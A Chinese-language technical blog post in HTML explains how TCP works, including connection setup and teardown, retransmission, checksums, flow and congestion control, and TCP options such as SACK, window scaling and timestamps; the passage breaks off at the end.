    <url>/2023/01/11/%E4%BC%A0%E8%BE%93%E5%B1%82%E5%8D%8F%E8%AE%AE%EF%BC%9ATCP%E5%8D%8F%E8%AE%AE%EF%BC%88%E4%B8%8B%EF%BC%89%E2%80%94%E2%80%94%E8%BF%90%E4%BD%9C%E6%96%B9%E5%BC%8F-%E5%A6%82%E4%BD%95%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E3%80%81%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B%E7%AD%89/</url>
    
    <content type="html"><![CDATA[<h1 id="传输层协议：TCP协议（下）——运作方式-如何三次握手、四次挥手等"><a href="#传输层协议：TCP协议（下）——运作方式-如何三次握手、四次挥手等" class="headerlink" title="传输层协议：TCP协议（下）——运作方式(如何三次握手、四次挥手等)"></a>传输层协议：TCP协议（下）——运作方式(如何三次握手、四次挥手等)</h1><h2 id="运作方式"><a href="#运作方式" class="headerlink" title="运作方式"></a>运作方式</h2><p>TCP协议的运行可划分为三个阶段：连接创建(<em>connection establishment</em>)、数据传送（<em>data transfer</em>）和连接终止（<em>connection termination</em>）。操作系统将TCP连接抽象为<a href="https://zh.wikipedia.org/wiki/Berkeley%E5%A5%97%E6%8E%A5%E5%AD%97">套接字</a>表示的本地端点（local end-point），作为编程接口给程序使用。在TCP连接的生命期内，本地端点要经历一系列的<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#%E7%8A%B6%E6%80%81%E7%BC%96%E7%A0%81">状态</a>改变。</p><h3 id="创建通路-——-三次握手"><a href="#创建通路-——-三次握手" class="headerlink" title="创建通路 —— 三次握手"></a>创建通路 —— 三次握手</h3><p>TCP用三次<a href="https://zh.wikipedia.org/wiki/%E6%8F%A1%E6%89%8B_(%E6%8A%80%E6%9C%AF)">握手</a>（或称三路握手，three-way handshake）过程创建一个连接。在连接创建过程中，很多参数要被初始化，例如序号被初始化以保证按序传输和连接的强壮性。</p><p><img src="https://static001.geekbang.org/resource/image/c0/08/c067fe62f49e8152368c7be9d91adc08.jpg?wh=1693*1093" alt="img"></p><p>TCP连接的正常创建</p><p>一对终端同时初始化一个它们之间的连接是可能的。但通常是由一端（服务器端）打开一个<a href="https://zh.wikipedia.org/wiki/Berkeley%E5%A5%97%E6%8E%A5%E5%AD%97">套接字</a>（<a href="https://zh.wikipedia.org/wiki/Socket">socket</a>）然后监听来自另一方（客户端）的连接，这就是通常所指的被动打开（passive open）。服务器端被被动打开以后，客户端就能开始创建主动打开（active open）。</p><p>服务器端执行了listen函数后，就在服务器上创建起两个队列：</p><ul><li>SYN队列：存放完成了二次握手的结果。 队列长度由listen函数的参数backlog指定。</li><li>ACCEPT队列：存放完成了三次握手的结果。队列长度由listen函数的参数backlog指定。</li></ul><p>三次握手协议的过程：</p><ol><li>客户端（通过执行connect函数）向服务器端发送一个SYN包，请求一个主动打开。该包携带客户端为这个连接请求而设定的随机数<strong>A</strong>作为消息序列号。</li><li>服务器端收到一个合法的SYN包后，把该包放入SYN队列中；回送一个SYN&#x2F;ACK。ACK的确认码应为<strong>A+1</strong>，SYN&#x2F;ACK包本身携带一个随机产生的序号<strong>B</strong>。</li><li>客户端收到SYN&#x2F;ACK包后，发送一个<a href="https://zh.wikipedia.org/wiki/%E7%A2%BA%E8%AA%8D%E8%A8%8A%E6%81%AF">ACK包</a>，该包的序号被设定为<strong>A+1</strong>，而ACK的确认码则为<strong>B+1</strong>。然后客户端的connect函数成功返回。当服务器端收到这个ACK包的时候，把请求帧从SYN队列中移出，放至ACCEPT队列中；这时accept函数如果处于阻塞状态，可以被唤醒，从ACCEPT队列中取出ACK包，重新创建一个新的用于双向通信的sockfd，并返回。</li></ol><p>如果服务器端接到了客户端发的SYN后回了SYN-ACK后客户端掉线了，服务器端没有收到客户端回来的ACK，那么，这个连接处于一个中间状态，既没成功，也没失败。于是，服务器端如果在一定时间内没有收到的TCP会重发SYN-ACK。在Linux下，默认重试次数为5次，重试的间隔时间从1s开始每次都翻倍，5次的重试时间间隔为1s, 2s, 4s, 8s, 16s，总共31s，第5次发出后还要等32s才知道第5次也超时了，所以，总共需要 1s + 2s + 4s+ 8s+ 16s + 32s &#x3D; 63s，TCP才会断开这个连接。使用三个TCP参数来调整行为：tcp_synack_retries 减少重试次数；tcp_max_syn_backlog，增大SYN连接数；tcp_abort_on_overflow决定超出能力时的行为。</p><p>“三次握手”的目的是“为了防止已失效的连接(connect)请求报文段传送到了服务端，因而产生错误”，也即为了解决“网络中存在延迟的重复分组”问题。例如：client发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达server。本来这是一个早已失效的报文段。但server收到此失效的连接请求报文段后，就误认为是client发出的一个新的连接请求。于是就向client发出确认报文段，同意创建连接。假设不采用“三次握手”，那么只要server发出确认，新的连接就创建了。由于现在client并没有发出创建连接的请求，因此不会理睬server的确认，也不会向server发送数据。但server却以为新的运输连接已经创建，并一直等待client发来数据。这样，server的很多资源就白白浪费掉了。采用“三次握手”的办法可以防止上述现象发生，client不会向server的确认发出确认。server由于收不到确认，就知道client并没有要求创建连接。</p><h3 id="终结通路-——-四次挥手"><a href="#终结通路-——-四次挥手" class="headerlink" title="终结通路 —— 四次挥手"></a>终结通路 —— 四次挥手</h3><p>连接终止使用了四次挥手过程（或称四次握手，four-way handshake），在这个过程中连接的每一侧都独立地被终止。当一个端点要停止它这一侧的连接，就向对侧发送FIN，对侧回复ACK表示确认。因此，拆掉一侧的连接过程需要一对FIN和ACK，分别由两侧端点发出。</p><p><img src="https://static001.geekbang.org/resource/image/bf/13/bf1254f85d527c77cc4088a35ac11d13.jpg?wh=1693*1534" alt="img"></p><p>首先发出FIN的一侧，如果给对侧的FIN响应了ACK，那么就会超时等待2*MSL时间，然后关闭连接。在这段超时等待时间内，本地的端口不能被新连接使用；避免延时的包的到达与随后的新连接相混淆。RFC793定义了MSL为2分钟，Linux设置成了30s。参数tcp_max_tw_buckets控制并发的TIME_WAIT的数量，默认值是180000，如果超限，那么，系统会把多的TIME_WAIT状态的连接给destory掉，然后在日志里打一个警告（如：time wait bucket table overflow）</p><p>连接可以工作在<a href="https://zh.wikipedia.org/w/index.php?title=TCP%E5%8D%8A%E5%BC%80&action=edit&redlink=1">TCP半开</a>状态。即一侧关闭了连接，不再发送数据；但另一侧没有关闭连接，仍可以发送数据。已关闭的一侧仍然应接收数据，直至对侧也关闭了连接。</p><p>也可以通过测三次握手关闭连接。主机A发出FIN，主机B回复FIN &amp; ACK，然后主机A回复ACK.[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-13">13]</a></p><p>一些主机（如<a href="https://zh.wikipedia.org/wiki/Linux">Linux</a>或<a href="https://zh.wikipedia.org/wiki/HP-UX">HP-UX</a>）的TCP栈能实现半双工关闭序列。这种主机如果主动关闭一个连接但还没有读完从这个连接已经收到的数据，该主机发送RST代替FIN[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-14">14]</a>。这使得一个TCP应用程序能确认远程应用程序已经读了所有已发送数据，并等待远程侧发出的FIN。但是远程的TCP栈不能区分<em>Connection Aborting RST</em>与<em>Data Loss RST</em>，两种原因都会导致远程的TCP栈失去所有的收到数据。</p><p>一些应用协议使用TCP open&#x2F;close handshaking，因为应用协议的TCP open&#x2F;close handshaking可以发现主动关闭的RST问题。例如：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">s = connect(<span class="hljs-name">remote</span>)<span class="hljs-comment">;</span><br>send(<span class="hljs-name">s</span>, data)<span class="hljs-comment">;</span><br>close(<span class="hljs-name">s</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>TCP&#x2F;IP栈采用上述方法不能保证所有数据到达对侧，如果未读数据已经到达对侧。</p><h3 id="资源使用"><a href="#资源使用" class="headerlink" title="资源使用"></a>资源使用</h3><p>主机收到一个TCP包时，用两端的IP地址与端口号来标识这个TCP包属于哪个session。使用一张表来存储所有的session，表中的每条称作Transmission Control Block（TCB），tcb结构的定义包括连接使用的源端口、目的端口、目的ip、序号、应答序号、对方窗口大小、己方窗口大小、tcp状态、tcp输入&#x2F;输出队列、应用层输出队列、tcp的重传有关变量等。</p><p>服务器端的连接数量是无限的，只受内存的限制。客户端的连接数量，过去由于在发送第一个SYN到服务器之前需要先分配一个随机空闲的端口，这限制了客户端IP地址的对外发出连接的数量上限。从Linux 4.2开始，有了socket选项IP_BIND_ADDRESS_NO_PORT，它通知Linux内核不保留usingbind使用端口号为0时内部使用的临时端口（ephemeral port），在connect时会自动选择端口以组成独一无二的四元组（同一个客户端端口可用于连接不同的服务器<a href="https://zh.wikipedia.org/wiki/%E5%A5%97%E6%8E%A5%E5%AD%97">套接字</a>；同一个服务器端口可用于接受不同客户端套接字的连接）。</p><p>对于不能确认的包、接收但还没读取的数据，都会占用操作系统的资源。</p><h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><p>在TCP的数据传送状态，很多重要的机制保证了TCP的可靠性和强壮性。它们包括：使用序号，对收到的TCP报文段进行排序以及检测重复的数据；使用校验和检测报文段的错误，即无错传输[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-3">3]</a>；使用确认和计时器来检测和纠正丢包或延时；流控制（Flow control）；拥塞控制（Congestion control）；丢失包的重传。</p><h4 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h4><p>通常在每个TCP报文段中都有一对序号和确认号。TCP报文发送者称自己的字节流的编号为序号（<em>sequence number</em>），称接收到对方的字节流编号为确认号。TCP报文的接收者为了确保可靠性，在接收到一定数量的连续字节流后才发送确认。这是对TCP的一种扩展，称为选择确认（Selective Acknowledgement）。选择确认使得TCP接收者可以对乱序到达的数据块进行确认。每一个字节传输过后，SN号都会递增1。</p><p>通过使用序号和确认号，TCP层可以把收到的报文段中的字节按正确的顺序交付给应用层。序号是32位的无符号数，在它增大到232-1时，便会回绕到0。对于初始化序列号(ISN)的选择是TCP中关键的一个操作，它可以确保强壮性和安全性。</p><p>TCP协议使用序号标识每端发出的字节的顺序，从而另一端接收数据时可以重建顺序，无惧传输时的<a href="https://zh.wikipedia.org/w/index.php?title=%E5%8C%85%E7%9A%84%E4%B9%B1%E5%BA%8F%E4%BA%A4%E4%BB%98&action=edit&redlink=1">包的乱序交付</a>或<a href="https://zh.wikipedia.org/wiki/%E4%B8%A2%E5%8C%85">丢包</a>。在发送第一个包时（SYN包），选择一个随机数作为序号的初值，以克制<a href="https://zh.wikipedia.org/w/index.php?title=TCP%E5%BA%8F%E5%8F%B7%E9%A2%84%E6%B5%8B%E6%94%BB%E5%87%BB&action=edit&redlink=1">TCP序号预测攻击</a>.</p><p>发送确认包（Acks），携带了接收到的对方发来的字节流的编号，称为确认号，以告诉对方已经成功接收的数据流的字节位置。Ack并不意味着数据已经交付了上层应用程序。</p><p>可靠性通过发送方检测到丢失的传输数据并重传这些数据。包括超时重传（Retransmission timeout，RTO）与重复累计确认（duplicate cumulative acknowledgements，DupAcks）。</p><h5 id="基于重复累计确认的重传"><a href="#基于重复累计确认的重传" class="headerlink" title="基于重复累计确认的重传"></a>基于重复累计确认的重传</h5><p>如果一个包（不妨设它的序号是100，即该包始于第100字节）丢失，接收方就不能确认这个包及其以后的包，因为采用了累计ack。接收方在收到100以后的包时，发出对包含第99字节的包的确认。这种重复确认是包丢失的信号。发送方如果收到3次对同一个包的确认，就重传最后一个未被确认的包。阈值设为3被证实可以减少乱序包导致的无作用的重传（spurious retransmission）现象。[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-4">4]</a> <a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#%E9%80%89%E6%8B%A9%E6%80%A7%E7%A1%AE%E8%AE%A4">选择性确认</a>（SACK）的使用能明确反馈哪个包收到了，极大改善了TCP重传必要的包的能力。</p><h5 id="超时重传"><a href="#超时重传" class="headerlink" title="超时重传"></a>超时重传</h5><p>发送方使用一个保守估计的时间作为收到数据包的确认的超时上限。如果超过这个上限仍未收到确认包，发送方将重传这个数据包。每当发送方收到确认包后，会重置这个重传定时器。典型地，定时器的值设定为<img src="https://s2.loli.net/2023/01/11/wgjGiDf14uvYLlh.png" alt="image.png">是时钟粒度。[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-5">5]</a>进一步，如果重传定时器被触发，仍然没有收到确认包，定时器的值将被设为前次值的二倍（直到特定阈值）。这是由于存在一类通过欺骗发送者使其重传多次，进而压垮接收者的攻击，而使用前述的定时器策略可以避免此类<a href="https://zh.wikipedia.org/wiki/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB">中间人攻击</a>方式的<a href="https://zh.wikipedia.org/wiki/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">拒绝服务攻击</a>。</p><h4 id="数据传输举例"><a href="#数据传输举例" class="headerlink" title="数据传输举例"></a>数据传输举例</h4><p><a href="https://zh.wikipedia.org/wiki/File:Tcp_transport_example.gif"><img src="https://s2.loli.net/2023/01/08/jlBeg6TA1hwaEFu.png" alt="image.png"></a></p><p>TCP数据传输</p><ol><li>发送方首先发送第一个包含序列号为1（可变化）和1460字节数据的TCP报文段给接收方。接收方以一个没有数据的TCP报文段来回复（只含报头），用确认号1461来表示已完全收到并请求下一个报文段。</li><li>发送方然后发送第二个包含序列号为1461，长度为1460字节的数据的TCP报文段给接收方。正常情况下，接收方以一个没有数据的TCP报文段来回复，用确认号2921（1461+1460）来表示已完全收到并请求下一个报文段。发送接收这样继续下去。</li><li>然而当这些数据包都是相连的情况下，接收方没有必要每一次都回应。比如，他收到第1到5条TCP报文段，只需回应第五条就行了。在例子中第3条TCP报文段被丢失了，所以尽管他收到了第4和5条，然而他只能回应第2条。</li><li>发送方在发送了第三条以后，没能收到回应，因此当时钟（timer）过时（expire）时，他重发第三条。（每次发送者发送一条TCP报文段后，都会再次启动一次时钟：RTT）。</li><li>这次第三条被成功接收，接收方可以直接确认第5条，因为4，5两条已收到。</li></ol><h4 id="校验和"><a href="#校验和" class="headerlink" title="校验和"></a>校验和</h4><p>TCP的16位的<a href="https://zh.wikipedia.org/wiki/%E6%A0%A1%E9%AA%8C%E5%92%8C">校验和</a>（checksum）的计算和检验过程如下：发送者将TCP报文段的头部和数据部分的和计算出来，再对其求<a href="https://zh.wikipedia.org/wiki/%E5%8F%8D%E7%A0%81">反码</a>（<a href="https://zh.wikipedia.org/wiki/%E4%B8%80%E8%A3%9C%E6%95%B8">一的补码</a>），就得到了校验和，然后将结果装入报文中传输。（这里用反码和的原因是这种方法的循环进位使校验和可以在16位、32位、64位等情况下的计算结果再叠加后相同）接收者在收到报文后再按相同的算法计算一次校验和。这里使用的反码使得接收者不用再将校验和字段保存起来后清零，而可以直接将报文段连同校验加总。如果计算结果是全部为一，那么就表示了报文的完整性和正确性。</p><p>注意：TCP校验和也包括了96位的伪头部，其中有源地址、目的地址、协议以及TCP的长度。这可以避免报文被错误地路由。</p><p>按现在的标准，TCP的校验和是一个比较脆弱的校验。出错概率高的数据链路层需要更高的能力来探测和纠正连接错误。TCP如果是在今天设计的，它很可能有一个32位的<a href="https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E6%A0%A1%E9%AA%8C">CRC校验</a>来纠错，而不是使用校验和。但是通过在第二层使用通常的<a href="https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E6%A0%A1%E9%AA%8C">CRC校验</a>或更完全一点的校验可以部分地弥补这种脆弱的校验。第二层是在TCP层和IP层之下的，比如<a href="https://zh.wikipedia.org/wiki/PPP">PPP</a>或<a href="https://zh.wikipedia.org/wiki/%E4%BB%A5%E5%A4%AA%E7%BD%91">以太网</a>，它们使用了这些校验。但是这也并不意味着TCP的16位校验和是冗余的，对于因特网传输的观察，表明在受<a href="https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%8E%AF%E5%86%97%E4%BD%99%E6%A0%A1%E9%AA%8C">CRC校验</a>保护的各跳之间，软件和硬件的错误通常也会在报文中引入错误，而端到端的TCP校验能够捕捉到大部分简单的错误。[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-6">6]</a> 这就是应用中的<a href="https://zh.wikipedia.org/w/index.php?title=%E7%AB%AF%E5%88%B0%E7%AB%AF&action=edit&redlink=1">端到端</a>原则。</p><h4 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h4><p><a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E9%87%8F%E6%8E%A7%E5%88%B6_(%E6%95%B0%E6%8D%AE)">流量控制</a>用来避免主机分组发送得过快而使接收方来不及完全收下，一般由接收方通告给发送方进行调控。</p><p>TCP使用<a href="https://zh.wikipedia.org/w/index.php?title=%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E5%8D%8F%E8%AE%AE&action=edit&redlink=1">滑动窗口协议</a>实现流量控制。接收方在“接收窗口”域指出还可接收的字节数量。发送方在没有新的确认包的情况下至多发送“接收窗口”允许的字节数量。接收方可修改“接收窗口”的值。</p><p><a href="https://zh.wikipedia.org/wiki/File:Tcp.svg"><img src="https://s2.loli.net/2023/01/08/PeOYlnvUZfFzyEN.png" alt="image.png"></a></p><p>TCP包的序号与接收窗口的行为很像时钟。</p><p>当接收方宣布接收窗口的值为0，发送方停止进一步发送数据，开始了“保持定时器”（persist timer），以避免因随后的修改接收窗口的数据包丢失使连接的双侧进入死锁，发送方无法发出数据直至收到接收方修改窗口的指示。当“保持定时器”到期时，TCP发送方尝试恢复发送一个小的ZWP包（Zero Window Probe），期待接收方回复一个带着新的接收窗口大小的确认包。一般ZWP包会设置成3次，如果3次过后还是0的话，有的TCP实现就会发RST把链接断了。</p><p>如果接收方以很小的增量来处理到来的数据，它会发布一系列小的接收窗口。这被称作<a href="https://zh.wikipedia.org/wiki/%E6%84%9A%E8%A0%A2%E7%AA%97%E5%8F%A3%E7%BB%BC%E5%90%88%E7%97%87">愚蠢窗口综合症</a>，因为它在TCP的数据包中发送很少的一些字节，相对于TCP包头是很大的开销。解决这个问题，就要避免对小的window size做出响应，直到有足够大的window size再响应：</p><ul><li>接收端使用David D Clark算法：如果收到的数据导致window size小于某个值，可以直接ack把window给关闭了，阻止了发送端再发数据。等到接收端处理了一些数据后windows size大于等于了MSS，或者接收端buffer有一半为空，就可以把window打开让发送端再发数据过来。</li><li>发送端使用Nagle算法来延时处理，条件一：Window Size&gt;&#x3D;MSS 且 Data Size &gt;&#x3D;MSS；条件二：等待时间或是超时200ms，这两个条件有一个满足，才会发数据，否则就是在积累数据。Nagle算法默认是打开的，所以对于一些需要小包场景的程序——比如像telnet或ssh这样的交互性程序，需要关闭这个算法。可以在Socket设置TCP_NODELAY选项来关闭这个算法。</li></ul><h4 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h4><p><a href="https://zh.wikipedia.org/wiki/TCP%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">拥塞控制</a>是发送方根据网络的承载情况控制分组的发送量，以获取高性能又能避免拥塞崩溃（congestion collapse，网络性能下降几个数量级）。这在网络流之间产生近似<a href="https://zh.wikipedia.org/w/index.php?title=%E6%9C%80%E5%A4%A7%E6%9C%80%E5%B0%8F%E5%85%AC%E5%B9%B3&action=edit&redlink=1">最大最小公平</a>分配。</p><p>发送方与接收方根据确认包或者包丢失的情况，以及定时器，估计网络拥塞情况，从而修改数据流的行为，这称为拥塞控制或网络拥塞避免。</p><p>TCP的现代实现包含四种相互影响的拥塞控制算法：<a href="https://zh.wikipedia.org/wiki/%E6%85%A2%E5%BC%80%E5%A7%8B">慢开始</a>、拥塞避免、<a href="https://zh.wikipedia.org/wiki/TCP%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6#%E5%BF%AB%E9%80%9F%E9%87%8D%E4%BC%A0">快速重传</a>、<a href="https://zh.wikipedia.org/wiki/TCP%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6#%E5%BF%AB%E9%80%9F%E6%81%A2%E5%A4%8D">快速恢复</a>。</p><p>此外，发送方采取“超时重传”（retransmission timeout，RTO），这是估计出<a href="https://zh.wikipedia.org/wiki/%E4%BE%86%E5%9B%9E%E9%80%9A%E8%A8%8A%E5%BB%B6%E9%81%B2">来回通信延迟</a> (RTT) 以及RTT的方差。</p><p>RFC793中定义的计算SRTT的经典算法：指数加权移动平均（Exponential weighted moving average）</p><ol><li>先采样RTT，记下最近好几次的RTT值。</li><li>做平滑计算SRTT公式为<img src="https://s2.loli.net/2023/01/11/5oWpVFqYEgcHNBb.png" alt="image.png">，其中 α 取值在0.8 到 0.9之间</li><li>计算RTO，公式：<img src="https://s2.loli.net/2023/01/11/4OPjtgHQJzbIlSf.png" alt="image.png">，其中 UBOUND是最大的timeout时间上限值，LBOUND是最小的timeout时间下限值，β值一般在1.3到2.0之间。</li></ol><p>目前有很多<a href="https://zh.wikipedia.org/wiki/TCP%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6">TCP拥塞控制算法</a>在研究中，感兴趣的可自行查看。</p><h3 id="最大分段大小"><a href="#最大分段大小" class="headerlink" title="最大分段大小"></a>最大分段大小</h3><p><a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E5%A4%A7%E5%88%86%E6%AE%B5%E5%A4%A7%E5%B0%8F">最大分段大小</a> (MSS)是在单个分段中TCP愿意接受的数据的字节数最大值。MSS应当足够小以避免<a href="https://zh.wikipedia.org/wiki/IP%E5%88%86%E7%89%87">IP分片</a>，它会导致丢包或过多的重传。在TCP连接创建时，双端在SYN报文中用MSS选项宣布各自的MSS，这是从双端各自直接相连的<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82">数据链路层</a>的<a href="https://zh.wikipedia.org/wiki/%E6%9C%80%E5%A4%A7%E4%BC%A0%E8%BE%93%E5%8D%95%E5%85%83">最大传输单元</a>（MTU）的尺寸减去固定的IP首部和TCP首部长度。以太网MTU为1500字节， MSS值可达1460字节。使用IEEE 802.3的MTU为1492字节，MSS可达1452字节。如果目的IP地址为“非本地的”，MSS通常的默认值为536（这个默认值允许20字节的IP首部和20字节的TCP首部以适合576字节IP数据报）。此外，发送方可用<a href="https://zh.wikipedia.org/w/index.php?title=%E4%BC%A0%E8%BE%93%E8%B7%AF%E5%BE%84MTU%E5%8F%91%E7%8E%B0&action=edit&redlink=1">传输路径MTU发现</a>（<a href="https://zh.wikipedia.org/wiki/RFC">RFC</a> <a href="https://tools.ietf.org/html/rfc1191">1191</a>）推导出从发送方到接收方的网络路径上的最小MTU，以此动态调整MSS以避免网络<a href="https://zh.wikipedia.org/wiki/IP%E5%88%86%E7%89%87">IP分片</a>。</p><p>MSS发布也被称作“MSS协商”（MSS negotiation）。严格讲，这并非是协商出来一个统一的MSS值，TCP允许连接两端使用各自不同的MSS值。[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-7">7]</a> 例如，这会发生在参与TCP连接的一台设备使用非常少的内存处理到来的TCP分组。</p><h3 id="选择确认"><a href="#选择确认" class="headerlink" title="选择确认"></a>选择确认</h3><p>最初采取累计确认的TCP协议在丢包时效率很低。例如，假设通过10个分组发出了1万个字节的数据。如果第一个分组丢失，在纯粹的累计确认协议下，接收方不能说它成功收到了1,000到9,999字节，但未收到包含0到999字节的第一个分组。因而，发送方可能必须重传所有1万个字节。</p><p>为此，TCP采取了“选择确认”（selective acknowledgment，SACK）选项。RFC 2018 对此定义为<strong>允许接收方确认它成功收到的分组的不连续的块</strong>，以及基础TCP确认的成功收到最后连续字节序号。这种确认可以指出<em>SACK block</em>，包含了已经成功收到的连续范围的开始与结束字节序号。在上述例子中，接收方可以发出SACK指出序号1000到9999，发送方因此知道只需重发第一个分组（字节 0 到 999）。</p><p>TCP发送方会把乱序收包当作丢包，因此会重传乱序收到的包，导致连接的性能下降。重复SACK选项（duplicate-SACK option）是定义在RFC 2883中的SACK的一项扩展，可解决这一问题。接收方发出D-ACK指出没有丢包，接收方恢复到高传输率。D-SACK使用了SACK的第一个段来做标志，</p><ul><li>如果SACK的第一个段的范围被ACK所覆盖，那么就是D-SACK;</li><li>如果SACK的第一个段的范围被SACK的第二个段覆盖，那么就是D-SACK</li></ul><p>D-SACK旨在告诉发送端：收到了重复的数据，数据包没有丢，丢的是ACK包；或者“Fast Retransmit算法”触发的重传不是因为发出去的包丢了，也不是因为回应的ACK包丢了，而是因为网络延时导致的reordering。</p><p>SACK选项并不是强制的。仅当双端都支持时才会被使用。TCP连接创建时会在TCP头中协商SACK细节。在 Linux下，可以通过tcp_sack参数打开SACK功能（Linux 2.4后默认打开）。Linux下的tcp_dsack参数用于开启D-SACK功能（Linux 2.4后默认打开）。选择确认也用于<a href="https://zh.wikipedia.org/wiki/%E6%B5%81%E6%8E%A7%E5%88%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE">流控制传输协议</a> (SCTP).</p><h3 id="TCP窗口缩放选项"><a href="#TCP窗口缩放选项" class="headerlink" title="TCP窗口缩放选项"></a>TCP窗口缩放选项</h3><p>TCP窗口尺寸域控制数据包在2至65,535字节。RFC 1323 定义的<a href="https://zh.wikipedia.org/w/index.php?title=TCP%E7%AA%97%E5%8F%A3%E7%BC%A9%E6%94%BE%E9%80%89%E9%A1%B9&action=edit&redlink=1">TCP窗口缩放选项</a>用于把最大窗口尺寸从65,535字节扩大至1G字节。扩大窗口尺寸是<a href="https://zh.wikipedia.org/w/index.php?title=TCP%E4%BC%98%E5%8C%96&action=edit&redlink=1">TCP优化</a>的需要。</p><p>窗口缩放选项尽在TCP三次握手时双端在SYN包中独立指出这个方向的缩放系数。该值是16比特窗口尺寸的向左位移数，从0 (表示不位移)至14。</p><p>某些路由器或分组防火墙会重写窗口缩放选项，这可能导致不稳定的网络传输。[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-8">8]</a></p><h3 id="TCP时间戳"><a href="#TCP时间戳" class="headerlink" title="TCP时间戳"></a>TCP时间戳</h3><p>RFC 1323 定义了TCP时间戳，并不对应于系统时钟，使用随机值初始化。许多操作系统每毫秒增加一次时间戳；但RFC只规定tick应当成比例。</p><p>有两个时间戳域:</p><ul><li>4字节的发送时间戳值</li><li>4字节的响应回复时间戳值（最近收到数据的时间戳）</li></ul><p>TCP时间戳用于“防止序列号回绕算法”（Protection Against Wrapped Sequence numbers，PAWS），细节见RFC 1323。PAWS用于接收窗口跨序号回绕边界。这种情形下一个包可能会重传以回答问题：“是否是第一个还是第二个4 GB的序号？”时间戳可以打破这一问题。</p><p>另外，Eifel检测算法（ RFC 3522 ）使用TCP时间戳确定如果重传发生是因为丢包还是简单乱序。</p><p>最近统计表明时间戳的采用率停滞在~40%，这归因于Windows服务器从Windows Server 2008起降低了支持。[<a href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE#cite_note-2017stats-9">9]</a>.</p><h3 id="带外数据"><a href="#带外数据" class="headerlink" title="带外数据"></a>带外数据</h3><p><a href="https://zh.wikipedia.org/w/index.php?title=%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE&action=edit&redlink=1">带外数据</a>（OOB）是指对紧急数据，中断或放弃排队中的数据流；接收方应立即处理紧急数据。完成后，TCP通知应用程序恢复流队列的正常处理。</p><p>OOB并不影响网络，“紧急”仅影响远程端的处理。这一协议很少被实现。</p><h3 id="强制数据递交"><a href="#强制数据递交" class="headerlink" title="强制数据递交"></a>强制数据递交</h3><p>正常情况下，TCP等待200 ms以准备一个完整分组发出（<a href="https://zh.wikipedia.org/wiki/%E7%B4%8D%E6%A0%BC%E7%AE%97%E6%B3%95">纳格算法</a>试图把小的信息组装为单一的包）。这产生了小的、但潜在很严重的延迟并在传递一个文件时不断重复延迟。例如，典型发送块是4 KB，典型的MSS是1460字节，在10 Mbit&#x2F;s以太网上发出两个包，每个耗时约~1.2 ms，随后是剩余1176个字节的包，之后是197 ms停顿因为TCP等待装满缓冲区。</p><p>对于telnet，每次用户击键的回应，如果有200 ms将会非常烦人。</p><p>socket选项<code>TCP_NODELAY</code>能放弃默认的200 ms发送延迟。应用程序使用这个socket选项强制发出数据。</p><p>RFC定义了<code>PSH</code>能立即发出比特。<a href="https://zh.wikipedia.org/wiki/Berkeley%E5%A5%97%E6%8E%A5%E5%AD%97">Berkeley套接字</a>不能控制或指出这种情形，只能由<a href="https://zh.wikipedia.org/wiki/%E5%8D%8F%E8%AE%AE%E6%A0%88">协议栈</a>控制。</p><h3 